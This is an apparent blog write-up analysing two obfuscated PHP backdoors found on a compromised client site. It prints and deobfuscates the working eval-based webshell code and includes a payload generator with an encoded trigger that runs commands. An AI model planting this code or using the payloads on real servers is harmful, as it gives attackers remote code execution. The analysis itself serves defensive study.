[]{#anchor}PHP Backdoor script analysis

So, one of our clients have had some unwanted visitors, leaving a couple
of gifts, and I thought I would take a closer look at some of these.

One of the dropped files were a short .php file, with some obfuscated
code:

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  \<?php\
  \$rrgdaww = \'b-x5mrc\\\'lsv6\#ufp394n\*Hig1\_tae87yk2od\';\$lyqov = Array();\$lyqov\[\] = \$rrgdaww\[21\].\$rrgdaww\[20\];\$lyqov\[\] = \$rrgdaww\[12\];\$lyqov\[\] = \$rrgdaww\[28\].\$rrgdaww\[17\].\$rrgdaww\[24\].\$rrgdaww\[0\].\$rrgdaww\[14\].\$rrgdaww\[11\].\$rrgdaww\[30\].\$rrgdaww\[35\].\$rrgdaww\[1\].\$rrgdaww\[30\].\$rrgdaww\[14\].\$rrgdaww\[33\].\$rrgdaww\[0\].\$rrgdaww\[1\].\$rrgdaww\[18\].\$rrgdaww\[33\].\$rrgdaww\[14\].\$rrgdaww\[14\].\$rrgdaww\[1\].\$rrgdaww\[29\].\$rrgdaww\[11\].\$rrgdaww\[35\].\$rrgdaww\[3\].\$rrgdaww\[1\].\$rrgdaww\[16\].\$rrgdaww\[27\].\$rrgdaww\[27\].\$rrgdaww\[3\].\$rrgdaww\[24\].\$rrgdaww\[27\].\$rrgdaww\[30\].\$rrgdaww\[3\].\$rrgdaww\[14\].\$rrgdaww\[33\].\$rrgdaww\[28\].\$rrgdaww\[17\];\$lyqov\[\] = \$rrgdaww\[6\].\$rrgdaww\[34\].\$rrgdaww\[13\].\$rrgdaww\[19\].\$rrgdaww\[26\];\$lyqov\[\] = \$rrgdaww\[9\].\$rrgdaww\[26\].\$rrgdaww\[5\].\$rrgdaww\[25\].\$rrgdaww\[5\].\$rrgdaww\[28\].\$rrgdaww\[15\].\$rrgdaww\[28\].\$rrgdaww\[27\].\$rrgdaww\[26\];\$lyqov\[\] = \$rrgdaww\[28\].\$rrgdaww\[2\].\$rrgdaww\[15\].\$rrgdaww\[8\].\$rrgdaww\[34\].\$rrgdaww\[35\].\$rrgdaww\[28\];\$lyqov\[\] = \$rrgdaww\[9\].\$rrgdaww\[13\].\$rrgdaww\[0\].\$rrgdaww\[9\].\$rrgdaww\[26\].\$rrgdaww\[5\];\$lyqov\[\] = \$rrgdaww\[27\].\$rrgdaww\[5\].\$rrgdaww\[5\].\$rrgdaww\[27\].\$rrgdaww\[31\].\$rrgdaww\[25\].\$rrgdaww\[4\].\$rrgdaww\[28\].\$rrgdaww\[5\].\$rrgdaww\[23\].\$rrgdaww\[28\];\$lyqov\[\] = \$rrgdaww\[9\].\$rrgdaww\[26\].\$rrgdaww\[5\].\$rrgdaww\[8\].\$rrgdaww\[28\].\$rrgdaww\[19\];\$lyqov\[\] = \$rrgdaww\[15\].\$rrgdaww\[27\].\$rrgdaww\[6\].\$rrgdaww\[32\];foreach (\$lyqov\[7\](\$\_COOKIE, \$\_POST) as \$upqahri =\> \$cmxizo){function qhdpi(\$lyqov, \$upqahri, \$qbwar){return \$lyqov\[6\](\$lyqov\[4\](\$upqahri . \$lyqov\[2\], (\$qbwar / \$lyqov\[8\](\$upqahri)) + 1), 0, \$qbwar);}function gwwsryf(\$lyqov, \$mofkmwg){return @\$lyqov\[9\](\$lyqov\[0\], \$mofkmwg);}function dhrqt(\$lyqov, \$mofkmwg){\$lqofrk = \$lyqov\[3\](\$mofkmwg) % 3;if (!\$lqofrk) {eval(\$mofkmwg\[1\](\$mofkmwg\[2\]));exit();}}\$cmxizo = gwwsryf(\$lyqov, \$cmxizo);dhrqt(\$lyqov, \$lyqov\[5\](\$lyqov\[1\], \$cmxizo \^ qhdpi(\$lyqov, \$upqahri, \$lyqov\[8\](\$cmxizo))));}

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

At first glance, this does not make much sense, though there are some
noticeable signs that should trigger the alarm bells:

-   The apparent use of obfuscation
-   The direct client interaction shown with \$\_COOKIE & \$\_POST
-   And the most alarming one, is the presence of the "eval" function

After cleaning it up abit, by adding some line breaks and indentation,
it starts to become clearer what is going on:

![](Pictures/10000201000003C600000239E95F755E361B52ED.png){width="6.2709in"
height="3.6945in"}

Its visible that:

-   A variable is initialized with some kind of string
-   An array is created with values concatenated from offsets in the
    above string
-   A loop over all key:value pairs from \$\_COOKIE & \$\_POST is
    happening
-   At some point an expression is evaluated

Let's take a look what the array contains after assignment:

  -----------------------------------------------------------
  \$lyqov = Array();\
  \$lyqov\[0\] = \"H\*\";\
  \$lyqov\[1\] = \"\#\";\
  \$lyqov\[2\] = \"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\";\
  \$lyqov\[3\] = \"count\";\
  \$lyqov\[4\] = \"str\_repeat\";\
  \$lyqov\[5\] = \"explode\";\
  \$lyqov\[6\] = \"substr\";\
  \$lyqov\[7\] = \"array\_merge\";\
  \$lyqov\[8\] = \"strlen\";\
  \$lyqov\[9\] = \"pack\";

  -----------------------------------------------------------

A lot of those value looks unmistakably like the names of PHP functions.

Let's make the script more readable with some Search/Replace, replacing
all the array references with its corresponding array value, as well as
some quick renaming of functions, variables and parameters.

  -----------------------------------------------------------------------------------------------------------------------------------
  \$mainArray = Array();\
  \$mainArray\[0\] = \"H\*\";\
  \$mainArray\[1\] = \"\#\";\
  \$mainArray\[2\] = \"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\";\
  \$mainArray\[3\] = \"count\";\
  \$mainArray\[4\] = \"str\_repeat\";\
  \$mainArray\[5\] = \"explode\";\
  \$mainArray\[6\] = \"substr\";\
  \$mainArray\[7\] = \"array\_merge\";\
  \$mainArray\[8\] = \"strlen\";\
  \$mainArray\[9\] = \"pack\";\
  \
  foreach (array\_merge(\$\_COOKIE, \$\_POST) as \$key =\> \$value){\
  \
  function func1(\$mainArray, \$key, \$func1\_p3){\
  return substr(str\_repeat(\$key . \"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\", (\$func1\_p3 / strlen(\$key)) + 1), 0, \$func1\_p3);\
  }\
  \
  function func2(\$mainArray, \$func2\_p2){\
  return \@pack(\"H\*\", \$func2\_p2);\
  }\
  \
  function func3(\$mainArray, \$func3\_p2){\
  \
  \$flag = count(\$func3\_p2) % 3;\
  \
  if (!\$flag) {\
  eval(\$func3\_p2\[1\](\$func3\_p2\[2\]));\
  exit();\
  }\
  }\
  \
  \$value = func2(\$mainArray, \$value);\
  \
  func3(\$mainArray, explode(\"\#\", \$value \^ func1(\$mainArray, \$key, strlen(\$value))));\
  }

  -----------------------------------------------------------------------------------------------------------------------------------

It now possible to see what is going on, but to fully understand the
functionality, I decided to take a deeper look by going through each
section, and doing some rewriting where's needed, as well as adding some
comments.

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
   // mainArray is no longer needed\
  \
  // Iterate all cookie and post parameters\
  foreach (array\_merge(\$\_COOKIE, \$\_POST) as \$key =\> \$value){\
  \
   // create repeating XOR cipher key to decipher \$value\
   function xorKey(\$key, \$valueLen){\
   // string substr ( string \$string , int \$start \[, int \$length \] )\
   return substr(\
   // string str\_repeat ( string \$input , int \$multiplier )\
   // Name of key used to deliver the payload, concatenated with some id eg. payloads are designed for specific targets, or atleast only accessible with id knowledge\
   // Repeat xorKey to atleast length of \$value\
   str\_repeat(\$key . \"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\", (\$valueLen / strlen(\$key)) + 1),\
   0,\
   \$valueLen\
   );\
   }\
  \
   // Get length of \$value before conversion to bin\
   \$valueLen = strlen(\$value);\
  \
   // Convert a binary expression (e.g., \"01000001 01000010 01000011\") into a binary-string\
   // Note : The @ is the error suppression operator in PHP! (Meaning any error in pack, will be ignored)\
   \$value = \@pack(\"H\*\", \$value);\
  \
   // XOR\
   /\*\
   \$value : supplied XOR cipher payload from entry arrays\
   \$xorKey : XOR cipher key fitted to length of \$value (\$key.\"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\") \* times to be larger than length of \$value\
   \*/\
   \$payload = \$value \^ xorKey(\$key, \$valueLen); \
   \
   // Create array for each element separated by \"\#\"\
   \$payloadArr = explode(\"\#\", \$payload);\
   \
   // is array length divisable by 3\
   \$flag = count(\$payloadArr) % 3;\
   if (!\$flag) {\
   // success\
   /\*\
   \$payload\[1\] : function or method name, likely something like base64\_decode or system\
   \$payload\[2\] : parameter for above function\
   \*/\
   eval(\$payloadArr\[1\](\$payloadArr\[2\]));\
   exit();\
   }\
   \
  }

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------

To summarise what is going on there, the script parses all parameters
provided in \$\_COOKIE & \$\_POST, looking for a key value pair, that
can be deciphered and on success evaluated.

Script flow:

1.  It iterates over all key:value pairs in \$\_COOKIE & \$\_POST,
    giving any client access to invoke this scripts functionality.
2.  To check if a key:value is a valid "payload", following is applied:

    a.  A repeating XOR cipher key is generated, based on key name and a
        > "unique" id in the script.

    b.  The value is converted to binary.

    c.  XOR is then applied to the binary value, using previously
        > generated key.

    d.  It is then made into an array, expecting each element is
        > separated by "\#".

    e.  If this array contains 3 (6,9..) elements, it's assumed a valid
        > payload.

3.  If a valid payload was found, it is provided to the eval function,
    giving access to running any serverside code supplied!
4.  Script ends execution flow, if 1 valid payload is found, or when all
    key:value pairs have been processed.

We now know that a valid trigger would look something like this:

  ---------------------------------------
  \$\_POST = \[\
  \"payload\" =\> \"0123456789abcdef\"\
  \];

  ---------------------------------------

To get a better look at what a payload would look like, I reversed the
functionality to be able to generate a valid payload.

+-----------------------------------------------------------------------+
| // Builds the payload, 3 examples, only 1st one is used\              |
| \$payload = \[\                                                       |
| // base64\_decode(\"echo \\\"Hi\\\"; \")\                             |
| \"unknwown\",\                                                        |
| \"base64\_decode\",\                                                  |
| base64\_encode(\"echo \\\"Hi\\\"; \"),\                               |
| \                                                                     |
| // system(\'ls-lah\')\                                                |
| \"unknwown\",\                                                        |
| \"system\",\                                                          |
| \"\'ls-lah\'\",\                                                      |
|                                                                       |
| \"unknwown\",// \[0\] Does not seem to be used, but could be to       |
| prevent accidentally processing \"normal\" parameters containing      |
| \"\#\"\                                                               |
| \"function\_name\",// \[1\] Function name\                            |
| \"function\_param\",// \[2\] Function param\                          |
| \];\                                                                  |
| \                                                                     |
| // Convert payload to string, separating entries by \"\#\"\           |
| \$payload = implode(\"\#\", \$payload);\                              |
| \                                                                     |
| // Set a key name for the payload, used when delivering the payload   |
| to the target\                                                        |
| \$payloadKeyName = \"payload\";\                                      |
| \                                                                     |
| // Set ID, used for either specific targets or as an access           |
| prevention to the specific backdoor script\                           |
| \$ID = \"e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9\";\                     |
| \                                                                     |
| // Create repeating XOR cipher key from (\$payloadKeyName & \$ID)\    |
| \$xorKey = str\_repeat(\$payloadKeyName . \$ID, (strlen(\$payload) /  |
| strlen(\$payloadKeyName)) + 1);\                                      |
| \                                                                     |
| // XOR cipher the \$payload using the \$xorKey\                       |
| \$pXOR = \$payload \^ \$xorKey;\                                      |
| \                                                                     |
| // Convert XOR\'ed payload into a hexadecimal string\                 |
| \$finishedPayload = \@unpack(\"H\*\", \$pXOR);                        |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

That gives us following payload:

  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  \[\
  \"payload\" =\> \"050f1202180e130b1a530315530150725303510d4951113c316357541d744460260a5c7e18760845470b521e16161b0142171c4a45070b157e085a59047a2f4a78651e0e4c7e410a7c47405c\"\
  \]

  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

And with a POST request to the initial script, we get a fine little "Hi"
message. =)

Oh and btw, VirusTotal had limited detection rate for this piece.

![](Pictures/1000020100000488000002C37A91EE22AFE9E030.png){width="6.2709in"
height="3.8193in"}

[]{#anchor-1}PHP Backdoor script analysis 2

Embedded backdoor found prepended onto an existing valid .php file.

The script is rather large, so I have cut out some of the string
concatenation parts.

Check pastebin link for full source \[link\]

+-----------------------------------------------------------------------+
| \<?php \$gb2407 = 578;\$GLOBALS\[\'rb22c05fb\'\] = Array();global     |
| \$rb22c05fb;\$rb22c05fb =                                             |
| \$GLOBALS;\${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}\[\'f884b\'\] =      |
| \"\\x6e\\x25\\x6f\\x3a\\x7a\\x34\\x4a\\x27\\x62\\x38\\x47\\x3f\\x6d\\ |
| x45\\x73\\x37\\x2f\\x3c\\x52\\x28\\x71\\x66\\x69\\x2d\\x50\\x75\\x53\ |
| \xa\\x78\\x77\\x68\\x2b\\x9\\x5d\\x51\\x6b\\x3e\\x2e\\x5a\\x67\\x49\\ |
| x7c\\x60\\x61\\x5b\\x7b\\x46\\x4c\\x22\\x4f\\x42\\x26\\x31\\x58\\x4d\ |
| \x44\\x6c\\x7d\\x63\\x59\\x23\\x5c\\x29\\x32\\x7e\\xd\\x40\\x3d\\x5e\ |
| \x76\\x30\\x5f\\x33\\x21\\x4b\\x4e\\x56\\x6a\\x65\\x74\\x43\\x57\\x79 |
| \\x35\\x41\\x39\\x2a\\x24\\x64\\x55\\x72\\x3b\\x20\\x2c\\x36\\x48\\x5 |
| 4\\x70\";\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[69\].\$rb22c05fb\[\'f |
| 884b\'\]\[78\].\$rb22c05fb\[\'f884b\'\]\[83\].\$rb22c05fb\[\'f884b\'\ |
| ]\[9\].\$rb22c05fb\[\'f884b\'\]\[88\].\$rb22c05fb\[\'f884b\'\]\[83\]. |
| \$rb22c05fb\[\'f884b\'\]\[5\].\$rb22c05fb\[\'f884b\'\]\[72\].\$rb22c0 |
| 5fb\[\'f884b\'\]\[63\]\]                                              |
| =                                                                     |
| \$rb22c05fb\[\'f884b\'\]\[58\].\$rb22c05fb\[\'f884b\'\]\[30\].\$rb22c |
| 05fb\[\'f884b\'\]\[90\];\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[12\].\ |
| $rb22c05fb\[\'f884b\'\]\[85\].\$rb22c05fb\[\'f884b\'\]\[63\].\$rb22c0 |
| 5fb\[\'f884b\'\]\[85\].\$rb22c05fb\[\'f884b\'\]\[9\]\]                |
| =                                                                     |
| \$rb22c05fb\[\'f884b\'\]\[2\].\$rb22c05fb\[\'f884b\'\]\[90\].\$rb22c0 |
| 5fb\[\'f884b\'\]\[88\];\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[20\].\$ |
| rb22c05fb\[\'f884b\'\]\[5\].\$rb22c05fb\[\'f884b\'\]\[94\].\$rb22c05f |
| b\[\'f884b\'\]\[88\].\$rb22c05fb\[\'f884b\'\]\[52\].\$rb22c05fb\[\'f8 |
| 84b\'\]\[43\].\$rb22c05fb\[\'f884b\'\]\[83\].\$rb22c05fb\[\'f884b\'\] |
| \[21\].\$rb22c05fb\[\'f884b\'\]\[52\]\]                               |
| =                                                                     |
| \$rb22c05fb\[\'f884b\'\]\[14\].\$rb22c05fb\[\'f884b\'\]\[79\].\$rb22c |
| 05fb\[\'f884b\'\]\[90\].\$rb22c05fb\[\'f884b\'\]\[56\].\$rb22c05fb\[\ |
| 'f884b\'\]\[78\].\$rb22c05fb\[\'f884b\'\]\[0\];\$rb22c05fb\[\$rb22c05 |
| fb\[\'f884b\'\]\[21\].\$rb22c05fb\[\'f884b\'\]\[8\].\$rb22c05fb\[\'f8 |
| 84b\'\]\[52\].\$rb22c05fb\[\'f884b\'\]\[85\].\$rb22c05fb\[\'f884b\'\] |
| \[83\].\$rb22c05fb\[\'f884b\'\]\[9\]\]                                |
| =                                                                     |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| 84b\'\]\[9\].\$rb22c05fb\[\'f884b\'\]\[21\]\] =                       |
| \$\_COOKIE;@\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[21\].\$rb22c05fb\[ |
| \'f884b\'\]\[8\].\$rb22c05fb\[\'f884b\'\]\[52\].\$rb22c05fb\[\'f884b\ |
| '\]\[85\].\$rb22c05fb\[\'f884b\'\]\[83\].\$rb22c05fb\[\'f884b\'\]\[9\ |
| ]\](\$rb22c05fb\[\'f884b\'\]\[78\].\$rb22c05fb\[\'                    |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| \'\]\[43\].\$rb22c05fb\[\'f884b\'\]\[78\].\$rb22c05fb\[\'f884b\'\]\[2 |
| 1\];global                                                            |
| \$x864b367c;function r6971a(\$e76477, \$qead07){global                |
| \$rb22c05fb;\$e112aa2d = \"\";for (\$n28c=0;                          |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| b\'\]\[21\].\$rb22c05fb\[\'f884b\'\]\[52\]\](\$e76477);){for          |
| (\$o70350cf=0;                                                        |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| \$qead07){global \$rb22c05fb;global \$x864b367c;return                |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| 3\]\](\$e76477, \$x864b367c), \$qead07);}foreach                      |
| (\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[56\].\$rb22c05fb\[\'f884b\'\] |
| \[43\].\$rb22c05fb\[\'f884b\'\]\[83\].\$rb22c05fb\[\'f884b\'\]\[58\]. |
| \$rb22c05fb\[\'f884b\'\]\[85\].\$rb22c05fb\[\'f884b\'\]\[72\].\$rb22c |
| 05fb\[\'f884b\'\]\[72\].\$rb22c05fb\[\'f884b\'\]\[9\].\$rb22c05fb\[\' |
| f884b\'\]\[21\]\]                                                     |
| as \$qead07=\>\$l0c59b){\$e76477 = \$l0c59b;\$k93f152 = \$qead07;}if  |
| (!\$e76477){foreach                                                   |
|                                                                       |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- SNIP                          |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--                               |
|                                                                       |
| \[\'f884b\'\]\[63\].\$rb22c05fb\[\'f884b\'\]\[58\].\$rb22c05fb\[\'f88 |
| 4b\'\]\[52\].\$rb22c05fb\[\'f884b\'\]\[70\].\$rb22c05fb\[\'f884b\'\]\ |
| [5\]\](\$e76477),                                                     |
| \$k93f152));if                                                        |
| (isset(\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\].\$rb22c05fb\[\'f884b\ |
| '\]\[35\]\])                                                          |
| &&                                                                    |
| \$x864b367c==\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\].\$rb22c05fb\[\' |
| f884b\'\]\[35\]\]){if                                                 |
| (\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\]\] ==                        |
| \$rb22c05fb\[\'f884b\'\]\[22\]){\$n28c =                              |
| Array(\$rb22c05fb\[\'f884b\'\]\[97\].\$rb22c05fb\[\'f884b\'\]\[69\]   |
| =\>                                                                   |
| @\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[12\].\$rb22c05fb\[\'f884b\'\] |
| \[63\].\$rb22c05fb\[\'f884b\'\]\[9\].\$rb22c05fb\[\'f884b             |
|                                                                       |
| \$rb22c05fb\[\'f884b\'\]\[52\].\$rb22c05fb\[\'f884b\'\]\[37\].\$rb22c |
| 05fb\[\'f884b\'\]\[70\].\$rb22c05fb\[\'f884b\'\]\[23\].\$rb22c05fb\[\ |
| 'f884b\'\]\[52\],);echo                                               |
| @\$rb22c05fb\[\$rb22c05fb\[\'f884b\'\]\[88\].\$rb22c05fb\[\'f884b\'\] |
| \[70\].\$rb22c05fb\[\'f884b\'\]\[63\].\$rb22c05fb\[\'f884b\'\]\[70\]. |
| \$rb22c05fb\[\'f884b\'\]\[15\].\$rb22c05fb\[\'f884b\'\]\[43\].\$rb22c |
| 05fb\[\'f884b\'\]\[15\].\$rb22c05fb\[\'f884b\'\]\[5\]\](\$n28c);}else |
| if                                                                    |
| (\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\]\] ==                        |
| \$rb22c05fb\[\'f884b\'\]\[78\]){eval/\*v4c8\*/(\$e76477\[\$rb22c05fb\ |
| [\'f884b\'\]\[88\]\]);}exit();}                                       |
| ?\>                                                                   |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

At first glance there's a couple of things to notice:

-   The script is all in one line, with a full "page" of space at the
    beginning, likely in attempt to go unnoticed in a text editor
    without word wrap.
-   It is highly obfuscated.
-   The "global" keyword can be seen used alot of places.
-   Once again the use of the \$\_COOKIE superglobal can be observed.
-   The "eval" function is at the end, separated by a /\* \*/ comment
    block, likely in an attempt to hide from automated detection.

Next let's go ahead and add some quick linebreaks and indentation, to
make it abit more readable:

![](Pictures/10000201000004220000044CC14A107E643047CC.png){width="6.2709in"
height="6.5138in"}

We can now begin to see some structure and a pattern used in alot of
these obfuscators, specifically the use initializing a string, and
creating a an array based of offsets in this string.

It is now possible to get an idea of whats going on:

-   Most of the obfuscation evolves around an array being initialized
    from a specific string of characters concatenated by offset. The
    array is made as a global.
-   The main initializing string is written in hex, including the array
    key name.
-   Just below the array is what seems to be some function calls, using
    the "@" error suppression operator.
-   A couple of functions are defined, a foreach loop and then a couple
    of conditions is checked, where the latter at some point calls the
    "eval" function. (also note the use of "echo" - so we might get some
    response from this script!)

Lets dump \$GLOBALS, to see what it contains after assignment:

  ----------------------------------------------------------------------------------------------------------------------------------------------------
  array(24) {\
  \[\"\_GET\"\] =\> array(0) { }\
  \[\"\_POST\"\] =\> array(0) { }\
  \[\"\_COOKIE\"\] =\> array(0) { }\
  \[\"\_FILES\"\] =\> array(0) { }\
  \[\"GLOBALS\"\] =\> array(24) { \*RECURSION\* }\
  \[\"gb2407\"\] =\> int(578)\
  \[\"rb22c05fb\"\] =\> array(24) { \*RECURSION\* }\
  \[\"e76477\"\] =\> NULL\
  \[\"k93f152\"\] =\> NULL\
  \[\"f884b\"\] =\> string(98) \"n%o:z4J\'b8G?mEs7/\<R(qfi-PuSxwh+\]Qk\>.ZgI\|\`a\[{FL\\\"OB&1XMDl}cY\#\\)2\~@=\^v0\_3!KNVjetCWy5A9\*\$dUr; ,6HTp\"\
  \[\"ve58d5432\"\] =\> string(3) \"chr\"\
  \[\"m9298\"\] =\> string(3) \"ord\"\
  \[\"q46d1a5f1\"\] =\> string(6) \"strlen\"\
  \[\"fb1958\"\] =\> string(7) \"ini\_set\"\
  \[\"d0207a74\"\] =\> string(9) \"serialize\"\
  \[\"m28921c1\"\] =\> string(10) \"phpversion\"\
  \[\"pc4fb4\"\] =\> string(11) \"unserialize\"\
  \[\"l432c104\"\] =\> string(13) \"base64\_decode\"\
  \[\"a518b496\"\] =\> string(14) \"set\_time\_limit\"\
  \[\"tdab3b\"\] =\> string(8) \"b6ddf34f\"\
  \[\"ka7b4d65\"\] =\> string(6) \"r6971a\"\
  \[\"f2a1a8fff\"\] =\> array(0) { } // \$\_POST;\
  \[\"la5c9338f\"\] =\> array(0) { } // \$\_COOKIE\
  \[\"x864b367c\"\] =\> string(36) \"d4a8745e-2599-49bc-b7e3-2b194ca49aef\"\
  }

  ----------------------------------------------------------------------------------------------------------------------------------------------------

As expected we can now see following:

-   "gb2407": An int (578) - Possibly a counter or build number? (It
    does not seem to be used, but could be retrieved with a successful
    payload)
-   \"f884b\" : Inner concat reference string for generating the ID in
    "x864b367c"
-   Multiple PHP function names.
-   References to \$\_POST & \$\_COOKIE.
-   \"x864b367c\": ID generated from "f884b"

Next step is to do some search/replace on all the string concatenations,
replacing them with the corresponding resolved value:

  ---------------------------------------------------------------------------------------------------------------------------------------------------
  global \$x864b367c;\
  function r6971a(\$e76477, \$qead07){\
  global \$rb22c05fb;\
  \$e112aa2d = \"\";\
  for (\$n28c=0; \$n28c\<\$rb22c05fb\[\'q46d1a5f1\'\](\$e76477);){\
  for (\$o70350cf=0; \$o70350cf\<\$rb22c05fb\[\'q46d1a5f1\'\](\$qead07) && \$n28c\<\$rb22c05fb\[\'q46d1a5f1\'\](\$e76477);\$o70350cf++, \$n28c++){\
   \$e112aa2d .= \$rb22c05fb\[\'ve58d5432\'\](\$rb22c05fb\[\'m9298\'\](\$e76477\[\$n28c\]) \^ \$rb22c05fb\[\'m9298\'\](\$qead07\[\$o70350cf\]));\
   }\
   }\
   return \$e112aa2d;\
  }\
  \
  function b6ddf34f(\$e76477, \$qead07){\
   global \$rb22c05fb;\
   global \$x864b367c;\
   return \$rb22c05fb\[\'ka7b4d65\'\](\$rb22c05fb\[\'ka7b4d65\'\](\$e76477, \$x864b367c), \$qead07);\
  }\
  \
  foreach (\$rb22c05fb\[\'la5c9338f\'\] as \$qead07=\>\$l0c59b){\
   \$e76477 = \$l0c59b;\
   \$k93f152 = \$qead07;\
  }\
  \
  if (!\$e76477){\
   foreach (\$rb22c05fb\[\'f2a1a8fff\'\] as \$qead07=\>\$l0c59b){\
   \$e76477 = \$l0c59b;\
   \$k93f152 = \$qead07;\
   }\
  }\
  \
  \$e76477 = @\$rb22c05fb\[\'pc4fb4\'\](\$rb22c05fb\[\'tdab3b\'\](\$rb22c05fb\[\'l432c104\'\](\$e76477), \$k93f152));\
  \
  if (isset(\$e76477\[\'ak\'\]) && \$x864b367c==\$e76477\[\'ak\'\]){\
   if (\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\]\] == \$rb22c05fb\[\'f884b\'\]\[22\]){\
   \$n28c = Array(\'pv\' =\> @\$rb22c05fb\[\'m28921c1\'\](),\'sv\' =\> \'1.0-1\',);\
   echo @\$rb22c05fb\[\'d0207a74\'\](\$n28c);\
   }\
   elseif (\$e76477\[\$rb22c05fb\[\'f884b\'\]\[43\]\] == \$rb22c05fb\[\'f884b\'\]\[78\]){\
   eval/\*v4c8\*/(\$e76477\[\$rb22c05fb\[\'f884b\'\]\[88\]\]);\
   }\
   exit();\
  }\

  ---------------------------------------------------------------------------------------------------------------------------------------------------

Without spending too much time on this stage, lets go ahead and replace
array references to proper value where possible:

+-----------------------------------------------------------------------+
| \@ini\_set(\'error\_log\', NULL);\                                    |
| \@ini\_set(\'log\_errors\', 0);\                                      |
| \@ini\_set(\'max\_execution\_time\', 0);\                             |
| \@set\_time\_limit(0);\                                               |
| \                                                                     |
| global \$x864b367c;\                                                  |
| function r6971a(\$e76477, \$qead07){\                                 |
| global \$rb22c05fb;\                                                  |
| \$e112aa2d = \"\";\                                                   |
| for (\$n28c=0; \$n28c\<strlen(\$e76477);){\                           |
| for (\$o70350cf=0; \$o70350cf\<strlen(\$qead07) &&                    |
| \$n28c\<strlen(\$e76477);\$o70350cf++, \$n28c++){\                    |
|  \$e112aa2d .= chr(ord(\$e76477\[\$n28c\]) \^                         |
| ord(\$qead07\[\$o70350cf\]));\                                        |
|  }\                                                                   |
|  }\                                                                   |
|  return \$e112aa2d;\                                                  |
